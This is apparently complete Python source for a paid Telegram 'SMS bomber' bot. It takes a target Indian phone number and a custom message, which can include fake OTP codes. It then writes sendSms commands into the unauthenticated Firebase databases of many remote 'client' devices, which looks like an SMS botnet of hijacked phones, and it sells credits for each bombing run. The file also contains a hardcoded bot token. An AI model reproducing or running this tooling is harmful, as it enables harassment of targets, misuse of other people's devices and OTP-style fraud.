#!/usr/bin/env python3
# 🔥 SHAKTI CUSTOM SMS BOMBER 🔥
# Developer: THE WARRIOR 
# Channel: @ZeroApiHub

import re
import os
import requests
import json
import sqlite3
import random
import string
import time
import asyncio
import logging
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# ============================
# LOGGING
# ============================
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================
# CONFIG
# ============================
TOKEN = '8825754114:AAG_4d08ZCDtPJyl2shz4UED5eBg8iHJcrQ'
OWNER_ID = 8825754114

FIREBASE_URLS = [
    "https://hello-aae5a-default-rtdb.firebaseio.com",
    "https://admin-sonu-8a567-default-rtdb.firebaseio.com",
    "https://admin-cliwny-default-rtdb.firebaseio.com",
    "https://jonisins-52271-default-rtdb.firebaseio.com",
    "https://priiieieie-default-rtdb.firebaseio.com",
    "https://godsbase-7c42e-default-rtdb.firebaseio.com",
    "https://cwpiah-default-rtdb.firebaseio.com",
    "https://junaid-cea15-default-rtdb.firebaseio.com",
    "https://raj-developer-7efe9-default-rtdb.firebaseio.com",
    "https://ppoi02-default-rtdb.firebaseio.com",
    "https://shilpa-e712a-default-rtdb.firebaseio.com",
    "https://dhumm-90a53-default-rtdb.firebaseio.com",
    "https://sudhir-suexs-seox-default-rtdb.firebaseio.com",
    "https://ahisjija-default-rtdb.firebaseio.com",
    "https://money-ace2c-default-rtdb.firebaseio.com",
    "https://jama-d7d04-default-rtdb.firebaseio.com",
    "https://joks-98a44-default-rtdb.firebaseio.com",
    "https://styles-girl-d7617-default-rtdb.firebaseio.com"
]

# ============================
# DATABASE
# ============================
DB_PATH = "bot_data.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, credits INTEGER DEFAULT 2, referrer_id INTEGER, joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS banned_users (user_id INTEGER PRIMARY KEY, banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, banned_by INTEGER)''')
    c.execute('''CREATE TABLE IF NOT EXISTS payments (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, credits_given INTEGER, transaction_id TEXT, screenshot_id TEXT, status TEXT DEFAULT 'pending', created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_history (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, action TEXT, details TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS sms_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, number TEXT, message TEXT, status TEXT, device_id TEXT, sent_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()
    print("✅ Database initialized.")

init_db()

# ============================
# DATABASE FUNCTIONS
# ============================
def is_owner(user_id): return user_id == OWNER_ID

def get_user_credits(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT credits FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row: return row[0]
    add_new_user(user_id); return 2

def add_new_user(user_id, referrer_id=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    if c.fetchone(): conn.close(); return
    c.execute("INSERT INTO users (user_id, credits, referrer_id) VALUES (?, ?, ?)", (user_id, 2, referrer_id))
    conn.commit()
    conn.close()
    if referrer_id and referrer_id != user_id:
        conn2 = sqlite3.connect(DB_PATH)
        c2 = conn2.cursor()
        c2.execute("SELECT credits FROM users WHERE user_id = ?", (referrer_id,))
        if c2.fetchone():
            c2.execute("UPDATE users SET credits = credits + 1 WHERE user_id = ?", (referrer_id,))
            conn2.commit()
        conn2.close()

def deduct_credit(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits - 1 WHERE user_id = ? AND credits > 0", (user_id,))
    affected = c.rowcount
    conn.commit()
    conn.close()
    return affected > 0

def add_credits(user_id, amount):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))
    conn.commit()
    conn.close()

def remove_credits(user_id, amount):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits - ? WHERE user_id = ? AND credits >= ?", (amount, user_id, amount))
    affected = c.rowcount
    conn.commit()
    conn.close()
    return affected > 0

def ban_user(user_id, admin_id):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO banned_users (user_id, banned_by) VALUES (?, ?)", (user_id, admin_id))
        conn.commit()
        conn.close()
        return True
    except: return False

def unban_user(user_id):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("DELETE FROM banned_users WHERE user_id = ?", (user_id,))
        affected = c.rowcount
        conn.commit()
        conn.close()
        return affected > 0
    except: return False

def is_user_banned(user_id):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id FROM banned_users WHERE user_id = ?", (user_id,))
        row = c.fetchone()
        conn.close()
        return row is not None
    except: return False

def create_payment(user_id, amount, credits_given, transaction_id=None, screenshot_id=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO payments (user_id, amount, credits_given, transaction_id, screenshot_id, status) VALUES (?, ?, ?, ?, ?, 'pending')''', (user_id, amount, credits_given, transaction_id, screenshot_id))
    payment_id = c.lastrowid
    conn.commit()
    conn.close()
    return payment_id

def log_user_action(user_id, action, details=""):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO user_history (user_id, action, details) VALUES (?, ?, ?)''', (user_id, action, details))
    conn.commit()
    conn.close()

def get_user_history(user_id, limit=10):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT action, details, created_at FROM user_history WHERE user_id = ? ORDER BY id DESC LIMIT ?''', (user_id, limit))
    rows = c.fetchall()
    conn.close()
    return rows

def log_sms(user_id, number, message, status, device_id=""):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO sms_logs (user_id, number, message, status, device_id) VALUES (?, ?, ?, ?, ?)''', (user_id, number, message[:50], status, device_id))
    conn.commit()
    conn.close()

def get_sms_logs(user_id, limit=10):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT number, message, status, device_id, sent_at FROM sms_logs WHERE user_id = ? ORDER BY id DESC LIMIT ?''', (user_id, limit))
    rows = c.fetchall()
    conn.close()
    return rows

def get_referral_link(user_id, bot_username):
    return f"https://t.me/{bot_username}?start=ref_{user_id}"

# ============================
# FIREBASE HELPERS
# ============================
def fetch_json_data(url, path, auth=None):
    base = url.rstrip('/')
    full_url = f"{base}/{path}.json"
    if auth and auth.strip():
        full_url += f"?auth={auth}"
    try:
        response = requests.get(full_url, timeout=10)
        if response.status_code == 200:
            return response.json()
        return None
    except:
        return None

def firebase_put(url, key, path, data):
    base = url.rstrip('/')
    full_url = f"{base}/{path}.json"
    if key and key.strip():
        full_url += f"?auth={key}"
    try:
        resp = requests.put(full_url, json=data, timeout=10)
        return resp.status_code in (200, 201)
    except:
        return False

def is_device_online(url, device_id):
    """Check if device is online by checking if webhookEvent exists"""
    try:
        check_url = f"{url}/clients/{device_id}/webhookEvent.json"
        response = requests.get(check_url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data is not None:
                return True
        return False
    except:
        return False

def generate_otp(length=6):
    return ''.join(random.choices(string.digits, k=length))

def validate_phone_number(number):
    number = number.strip()
    if not number.startswith('+91'):
        return False, "❌ Number must start with +91"
    remaining = number[3:]
    if not remaining.isdigit():
        return False, "❌ Only digits allowed after +91"
    if len(remaining) != 10:
        return False, f"❌ Enter exactly 10 digits after +91 (you entered {len(remaining)})"
    return True, "✅ Valid number"

# ============================
# GET DEVICE STATUS (ONLINE/OFFLINE/TOTAL)
# ============================
def get_device_status():
    total_online = 0
    total_offline = 0
    cluster_status = []
    
    for url in FIREBASE_URLS:
        online = 0
        offline = 0
        try:
            clients = fetch_json_data(url, "/clients", auth=None)
            if clients and isinstance(clients, dict):
                device_ids = list(clients.keys())
                for dev_id in device_ids:
                    if is_device_online(url, dev_id):
                        online += 1
                    else:
                        offline += 1
                total_online += online
                total_offline += offline
                
                cluster_name = url.replace("https://", "").replace(".firebaseio.com", "").replace(".asia-southeast1.firebasedatabase.app", "")
                cluster_status.append({
                    "name": cluster_name,
                    "online": online,
                    "offline": offline,
                    "total": online + offline
                })
        except:
            cluster_name = url.replace("https://", "").replace(".firebaseio.com", "").replace(".asia-southeast1.firebasedatabase.app", "")
            cluster_status.append({
                "name": cluster_name,
                "online": 0,
                "offline": 0,
                "total": 0,
                "error": True
            })
    
    return {
        "total_online": total_online,
        "total_offline": total_offline,
        "total_devices": total_online + total_offline,
        "clusters": cluster_status
    }

# ============================
# KEYBOARD (PER-USER)
# ============================
def get_main_keyboard(user_id):
    if is_owner(user_id):
        keyboard = [
            [KeyboardButton("🔴 START BOMBING")],
            [KeyboardButton("💰 Credits"), KeyboardButton("💳 Recharge")],
            [KeyboardButton("👑 Admin Panel")]
        ]
    else:
        keyboard = [
            [KeyboardButton("🔴 START BOMBING")],
            [KeyboardButton("💰 Credits"), KeyboardButton("💳 Recharge")]
        ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ============================
# BOT HANDLERS
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_user_banned(user_id):
        await update.message.reply_text("❌ You are banned.")
        return
    
    referrer_id = None
    if context.args and len(context.args) > 0:
        payload = context.args[0]
        if payload.startswith("ref_"):
            try: referrer_id = int(payload.split("_")[1])
            except: pass
    
    add_new_user(user_id, referrer_id)
    credits = get_user_credits(user_id)
    
    welcome = f"""
🔥 *WARRIOR CUSTOM BOMBER* 🔥

━━━━━━━━━━━━━━━━━━━━━━━━━━
🟢 Status: ONLINE
💰 Credits: {credits}
👤 ID: {user_id}
━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 Each SMS = 1 credit
📌 Invite friends = free credits

👇 Select an option below
"""
    
    await update.message.reply_text(welcome, parse_mode="HTML", reply_markup=get_main_keyboard(user_id))

# ============================
# TEXT HANDLER
# ============================
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if is_user_banned(user_id):
        await update.message.reply_text("❌ You are banned.")
        return
    
    bulk_step = context.user_data.get('bulk_step')
    recharge_step = context.user_data.get('recharge_step')
    
    # 🔴 START BOMBING
    if text == "🔴 START BOMBING":
        credits = get_user_credits(user_id)
        if credits <= 0:
            await update.message.reply_text("❌ **Insufficient credits!**")
            return
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="back_menu")],
            [InlineKeyboardButton("❌ Cancel", callback_data="cancel_bomb")]
        ])
        await update.message.reply_text(
            f"📞 *Enter recipient phone number:*\n✅ Format: +91XXXXXXXXXX\n\n💰 Credits: {credits}",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
        context.user_data['bulk_step'] = 'number'
        return
    
    # Number input
    if bulk_step == 'number':
        number = text.strip()
        valid, msg = validate_phone_number(number)
        if not valid:
            await update.message.reply_text(f"{msg}\n\n📞 Format: +91XXXXXXXXXX")
            return
        context.user_data['bulk_number'] = number
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="back_menu")],
            [InlineKeyboardButton("❌ Cancel", callback_data="cancel_bomb")]
        ])
        await update.message.reply_text(
            "✏️ *Enter your custom message:*\n\n💡 You can use {otp} for random OTP.\nExample: Your OTP is {otp}",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
        context.user_data['bulk_step'] = 'custom_msg'
        return
    
    # Custom message input
    if bulk_step == 'custom_msg':
        msg_text = text
        if not msg_text:
            await update.message.reply_text("❌ Message cannot be empty.")
            return
        context.user_data['custom_message'] = msg_text
        
        if not deduct_credit(user_id):
            await update.message.reply_text("❌ Insufficient balance.")
            return
        
        log_user_action(user_id, "Bulk SMS Started", f"Target: {context.user_data['bulk_number']}")
        await update.message.reply_text("📤 **Starting bulk SMS...**")
        await perform_bulk_send(update, context)
        return
    
    # Recharge step
    if recharge_step == 'payment':
        if update.message.photo:
            file_id = update.message.photo[-1].file_id
            credits = context.user_data.get('recharge_credits', 0)
            amount = context.user_data.get('recharge_amount', 0)
            if credits == 0:
                await update.message.reply_text("❌ Session expired.")
                return
            payment_id = create_payment(user_id, amount, credits, screenshot_id=file_id)
            await update.message.reply_text(f"✅ Screenshot received! Payment ID: #{payment_id}")
            try:
                await context.application.bot.send_message(OWNER_ID, f"📥 New Payment Screenshot\nUser: {user_id}\nAmount: ₹{amount}\nCredits: {credits}")
            except: pass
            context.user_data.pop('recharge_step', None)
            context.user_data.pop('recharge_credits', None)
            context.user_data.pop('recharge_amount', None)
            return
        elif text and not text.startswith('/'):
            txn_id = text.strip()
            credits = context.user_data.get('recharge_credits', 0)
            amount = context.user_data.get('recharge_amount', 0)
            if credits == 0:
                await update.message.reply_text("❌ Session expired.")
                return
            payment_id = create_payment(user_id, amount, credits, transaction_id=txn_id)
            await update.message.reply_text(f"✅ Transaction ID received: `{txn_id}`\nPayment ID: #{payment_id}")
            try:
                await context.application.bot.send_message(OWNER_ID, f"📥 New Payment (Txn ID)\nUser: {user_id}\nAmount: ₹{amount}\nCredits: {credits}\nTxn: {txn_id}")
            except: pass
            context.user_data.pop('recharge_step', None)
            context.user_data.pop('recharge_credits', None)
            context.user_data.pop('recharge_amount', None)
            return
        return
    
    # 💰 Credits
    if text == "💰 Credits":
        credits = get_user_credits(user_id)
        await update.message.reply_text(f"💰 **Your Credits:** `{credits}`", parse_mode="HTML")
        return
    
    # 💳 Recharge
    if text == "💳 Recharge":
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("💳 10 Credits - ₹20", callback_data="recharge_10_20")],
            [InlineKeyboardButton("💎 25 Credits - ₹50", callback_data="recharge_25_50")],
            [InlineKeyboardButton("🚀 50 Credits - ₹100", callback_data="recharge_50_100")],
            [InlineKeyboardButton("👑 100 Credits - ₹200", callback_data="recharge_100_200")],
            [InlineKeyboardButton("❌ Cancel", callback_data="recharge_cancel")]
        ])
        await update.message.reply_text("💳 *Select Recharge Plan:*", reply_markup=markup, parse_mode="HTML")
        return
    
    # 👑 Admin Panel
    if text == "👑 Admin Panel":
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Unauthorized.")
            return
        await show_admin_panel(update, context)
        return
    
    await update.message.reply_text("❌ Please use the buttons below.", reply_markup=get_main_keyboard(user_id))

# ============================
# ADMIN PANEL
# ============================
async def show_admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    c.execute("SELECT SUM(credits) FROM users")
    total_credits = c.fetchone()[0] or 0
    c.execute("SELECT COUNT(*) FROM banned_users")
    total_banned = c.fetchone()[0]
    conn.close()
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Live Status", callback_data="admin_status")],
        [InlineKeyboardButton("👥 All Users", callback_data="admin_users")],
        [InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban")],
        [InlineKeyboardButton("✅ Unban User", callback_data="admin_unban")],
        [InlineKeyboardButton("➕ Add Credits", callback_data="admin_addcredits")],
        [InlineKeyboardButton("➖ Remove Credits", callback_data="admin_removecredits")],
        [InlineKeyboardButton("📋 View Logs", callback_data="admin_logs")],
        [InlineKeyboardButton("🗑️ Clear Logs", callback_data="admin_clearlogs")],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
    ])
    
    response = f"""
👑 *Admin Panel*

━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 *System Stats*

🟢 Status: ONLINE
👥 Total Users: {total_users}
💰 Total Credits: {total_credits}
🚫 Banned Users: {total_banned}
━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    await update.message.reply_text(response, parse_mode="HTML", reply_markup=keyboard)

# ============================
# CALLBACK HANDLERS
# ============================
async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data
    
    # ===== BACK / CANCEL =====
    if data == "back_menu":
        context.user_data.pop('bulk_step', None)
        context.user_data.pop('recharge_step', None)
        context.user_data.pop('stop_sending', None)
        await query.edit_message_text("👇 Select an option below")
        await query.message.reply_text("Main Menu:", reply_markup=get_main_keyboard(user_id))
        return
    
    if data == "cancel_bomb":
        context.user_data.pop('bulk_step', None)
        await query.edit_message_text("❌ Cancelled.")
        await query.message.reply_text("👇 Select an option below", reply_markup=get_main_keyboard(user_id))
        return
    
    # ===== STOP BULK =====
    if data == "stop_bulk":
        context.user_data['stop_sending'] = True
        await query.edit_message_text("⏹️ Stopping bombing...")
        return
    
    # ===== RECHARGE =====
    if data.startswith("recharge_"):
        if data == "recharge_cancel":
            await query.edit_message_text("❌ Recharge cancelled.")
            return
        _, credits, amount = data.split("_")
        credits = int(credits)
        amount = int(amount)
        context.user_data['recharge_credits'] = credits
        context.user_data['recharge_amount'] = amount
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="back_menu")]
        ])
        await query.edit_message_text(
            f"💳 *Recharge Plan Selected*\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n💰 Plan: {credits} Credits\n💵 Amount: ₹{amount}\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n📌 *Contact for payment:*\n👥 @warrior_credit\n\n📱 Send your User ID and Payment Screenshot\n✅ Credits will be added after verification.",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
        return
    
    # ===== ADMIN PANEL CALLBACKS =====
    if data == "admin_status":
        status = get_device_status()
        
        response = f"""
📊 *Live System Status*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🟢 Bot: ONLINE
📡 Firebase: CONNECTED
💾 Database: ACTIVE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📱 *Device Status*

🟢 Online: `{status['total_online']}`
🔴 Offline: `{status['total_offline']}`
📊 Total: `{status['total_devices']}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 *Cluster Breakdown*
"""
        for c in status['clusters']:
            if c['total'] > 0:
                response += f"\n🔹 {c['name']}: 🟢{c['online']} 🔴{c['offline']} 📊{c['total']}"
            else:
                response += f"\n🔹 {c['name']}: ❌ Unreachable"
        
        await query.edit_message_text(response, parse_mode="HTML")
        return
    
    if data == "admin_users":
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id FROM users LIMIT 20")
        users = c.fetchall()
        conn.close()
        
        if not users:
            await query.edit_message_text("📭 No users found.")
            return
        
        response = "👥 *All Users:*\n\n"
        for (uid,) in users:
            banned = is_user_banned(uid)
            status = "🚫" if banned else "✅"
            response += f"{status} `{uid}`\n"
        response += f"\nTotal: {len(users)} users"
        await query.edit_message_text(response, parse_mode="HTML")
        return
    
    if data == "admin_ban":
        context.user_data['admin_action'] = 'ban'
        await query.edit_message_text("🚫 *Ban User*\n\nEnter user ID to ban:\nExample: 1234567890")
        return
    
    if data == "admin_unban":
        context.user_data['admin_action'] = 'unban'
        await query.edit_message_text("✅ *Unban User*\n\nEnter user ID to unban:\nExample: 1234567890")
        return
    
    if data == "admin_addcredits":
        context.user_data['admin_action'] = 'addcredits'
        await query.edit_message_text("➕ *Add Credits*\n\nEnter user ID and amount:\nFormat: user_id amount\nExample: 1234567890 50")
        return
    
    if data == "admin_removecredits":
        context.user_data['admin_action'] = 'removecredits'
        await query.edit_message_text("➖ *Remove Credits*\n\nEnter user ID and amount:\nFormat: user_id amount\nExample: 1234567890 10")
        return
    
    if data == "admin_logs":
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id, action, details, created_at FROM user_history ORDER BY id DESC LIMIT 10")
        logs = c.fetchall()
        conn.close()
        
        if not logs:
            await query.edit_message_text("📭 No logs found.")
            return
        
        response = "📋 *Recent Logs:*\n\n"
        for uid, action, details, created_at in logs:
            dt = created_at[:19] if created_at else "N/A"
            response += f"👤 {uid}\n📌 {action} - {details}\n🕐 {dt}\n\n"
        await query.edit_message_text(response, parse_mode="HTML")
        return
    
    if data == "admin_clearlogs":
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("DELETE FROM user_history")
        conn.commit()
        conn.close()
        await query.edit_message_text("🗑️ Logs cleared successfully!")
        return

# ============================
# PERFORM BULK SEND (AUTO-STOP)
# ============================
async def perform_bulk_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_user_banned(user_id):
        await update.message.reply_text("❌ You are banned.")
        return
    
    data = context.user_data
    number = data.get("bulk_number")
    msg_text = data.get("custom_message")
    if not number or not msg_text:
        await update.message.reply_text("❌ Missing data. Please start again.")
        return
    
    context.user_data['stop_sending'] = False
    stop_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("⏹ Stop", callback_data="stop_bulk")]
    ])
    
    progress_msg = await update.message.reply_text(
        "╔══════════════════════════════════════╗\n"
        "║  📤 **BULK SMS IN PROGRESS**        ║\n"
        "╠══════════════════════════════════════╣\n"
        "║  🔄 Status: `SCANNING...`           ║\n"
        "║  ✅ Sent: `0`                       ║\n"
        "║  ❌ Failed: `0`                     ║\n"
        "║  📱 Online Devices: `0`             ║\n"
        "╚══════════════════════════════════════╝",
        parse_mode="HTML",
        reply_markup=stop_markup
    )
    
    total_sent = 0
    total_failed = 0
    total_online = 0
    
    otp_placeholder = re.search(r'\{otp(:\d+)?\}', msg_text)
    otp_length = 6
    if otp_placeholder and otp_placeholder.group(1):
        try:
            otp_length = int(otp_placeholder.group(1)[1:])
        except:
            otp_length = 6
    
    # ✅ FIRST PASS: Count online devices
    online_devices = []
    for url in FIREBASE_URLS:
        if context.user_data.get('stop_sending', False) or is_user_banned(user_id):
            break
        try:
            clients = fetch_json_data(url, "/clients", auth=None)
            if not clients or not isinstance(clients, dict):
                continue
            for dev_id in clients.keys():
                if is_device_online(url, dev_id):
                    online_devices.append((url, dev_id))
                    total_online += 1
        except:
            continue
    
    # Update progress with total online count
    try:
        await progress_msg.edit_text(
            f"╔══════════════════════════════════════╗\n"
            f"║  📤 **BULK SMS IN PROGRESS**        ║\n"
            f"╠══════════════════════════════════════╣\n"
            f"║  🔄 Status: `SENDING...`            ║\n"
            f"║  ✅ Sent: `0`                       ║\n"
            f"║  ❌ Failed: `0`                     ║\n"
            f"║  📱 Online Devices: `{total_online}` ║\n"
            f"╚══════════════════════════════════════╝",
            parse_mode="HTML",
            reply_markup=stop_markup
        )
    except:
        pass
    
    # ✅ SECOND PASS: Send to online devices
    for url, dev_id in online_devices:
        # ✅ AUTO-STOP: Jab sab devices ko bhej diya
        if total_sent >= total_online:
            break
        
        if context.user_data.get('stop_sending', False) or is_user_banned(user_id):
            break
        
        final_msg = msg_text
        if otp_placeholder:
            otp = generate_otp(otp_length)
            final_msg = re.sub(r'\{otp(:\d+)?\}', otp, msg_text)
        
        path = f"clients/{dev_id}/webhookEvent/sendSms"
        payload = {"sim": 1, "to": number, "message": final_msg, "isSended": False}
        
        ok = firebase_put(url, None, path, payload)
        
        if ok:
            total_sent += 1
            log_sms(user_id, number, final_msg, "success", dev_id[:8])
            logger.info(f"✅ SENT via {dev_id[:8]} ({total_sent}/{total_online})")
        else:
            total_failed += 1
            log_sms(user_id, number, final_msg, "failed", dev_id[:8] if dev_id else "unknown")
            logger.warning(f"❌ FAILED via {dev_id[:8]}")
        
        progress_text = (
            f"╔══════════════════════════════════════╗\n"
            f"║  📤 **BULK SMS IN PROGRESS**        ║\n"
            f"╠══════════════════════════════════════╣\n"
            f"║  🔄 Status: `SENDING...`            ║\n"
            f"║  ✅ Sent: `{total_sent}`             ║\n"
            f"║  ❌ Failed: `{total_failed}`         ║\n"
            f"║  📱 Online: `{total_online}`         ║\n"
            f"║  📊 Progress: `{int(total_sent/total_online*100) if total_online > 0 else 0}%` ║\n"
            f"╚══════════════════════════════════════╝"
        )
        try:
            await progress_msg.edit_text(progress_text, parse_mode="HTML", reply_markup=stop_markup)
        except:
            pass
        
        await asyncio.sleep(0.3)
    
    # ✅ AUTO-STOP: Jab sab devices ko bhej diya
    if total_sent >= total_online and total_online > 0:
        context.user_data['stop_sending'] = True
    
    # Final Status
    if context.user_data.get('stop_sending', False) and total_sent >= total_online:
        final_text = (
            f"╔══════════════════════════════════════╗\n"
            f"║  ✅ **BULK SMS COMPLETE**            ║\n"
            f"╠══════════════════════════════════════╣\n"
            f"║  ✅ Sent: `{total_sent}`             ║\n"
            f"║  ❌ Failed: `{total_failed}`         ║\n"
            f"║  📱 Online: `{total_online}`         ║\n"
            f"║  📱 Target: `{number}`              ║\n"
            f"║  🎯 All online devices done!         ║\n"
            f"╚══════════════════════════════════════╝"
        )
    elif context.user_data.get('stop_sending', False):
        final_text = (
            f"╔══════════════════════════════════════╗\n"
            f"║  ⏹️ **BOMBING STOPPED!**             ║\n"
            f"╠══════════════════════════════════════╣\n"
            f"║  ✅ Sent: `{total_sent}`             ║\n"
            f"║  ❌ Failed: `{total_failed}`         ║\n"
            f"║  📱 Online: `{total_online}`         ║\n"
            f"║  📱 Target: `{number}`              ║\n"
            f"║  ⚠️ Stopped by user                  ║\n"
            f"╚══════════════════════════════════════╝"
        )
    else:
        final_text = (
            f"╔══════════════════════════════════════╗\n"
            f"║  ⚠️ **BULK SMS PARTIAL**             ║\n"
            f"╠══════════════════════════════════════╣\n"
            f"║  ✅ Sent: `{total_sent}`             ║\n"
            f"║  ❌ Failed: `{total_failed}`         ║\n"
            f"║  📱 Online: `{total_online}`         ║\n"
            f"║  📱 Target: `{number}`              ║\n"
            f"╚══════════════════════════════════════╝"
        )
    
    try:
        await progress_msg.edit_text(final_text, parse_mode="HTML")
        await progress_msg.edit_reply_markup(reply_markup=None)
    except:
        pass
    
    log_user_action(user_id, "Bulk SMS Ended", f"Sent {total_sent}, Failed {total_failed}")
    context.user_data.pop('stop_sending', None)
    context.user_data.pop('bulk_step', None)
    context.user_data.pop('bulk_number', None)
    context.user_data.pop('custom_message', None)
    
    await update.message.reply_text("👇 Select an option below", reply_markup=get_main_keyboard(user_id))

# ============================
# OWNER COMMANDS
# ============================
async def add_credits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /addcredits <user_id> <amount>")
        return
    try:
        target = int(args[0]); amount = int(args[1])
        add_credits(target, amount)
        await update.message.reply_text(f"✅ Added {amount} credits to user {target}.")
    except:
        await update.message.reply_text("❌ Invalid input.")

async def remove_credits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /removecredits <user_id> <amount>")
        return
    try:
        target = int(args[0]); amount = int(args[1])
        if remove_credits(target, amount):
            await update.message.reply_text(f"✅ Removed {amount} credits from user {target}.")
        else:
            await update.message.reply_text(f"❌ Failed. User may have insufficient credits.")
    except:
        await update.message.reply_text("❌ Invalid input.")

async def ban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /ban <user_id>")
        return
    try:
        target = int(args[0])
        if ban_user(target, update.effective_user.id):
            await update.message.reply_text(f"✅ User {target} banned.")
        else:
            await update.message.reply_text("❌ Failed to ban.")
    except:
        await update.message.reply_text("❌ Invalid user ID.")

async def unban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /unban <user_id>")
        return
    try:
        target = int(args[0])
        if unban_user(target):
            await update.message.reply_text(f"✅ User {target} unbanned.")
        else:
            await update.message.reply_text("❌ User was not banned.")
    except:
        await update.message.reply_text("❌ Invalid user ID.")

async def shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    await update.message.reply_text("🛑 Bot is shutting down...")
    await context.application.stop()
    os._exit(0)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    context.user_data.pop('bulk_step', None)
    context.user_data.pop('recharge_step', None)
    context.user_data.pop('stop_sending', None)
    context.user_data.pop('admin_action', None)
    await update.message.reply_text("❌ Cancelled.", reply_markup=get_main_keyboard(user_id))

# ============================
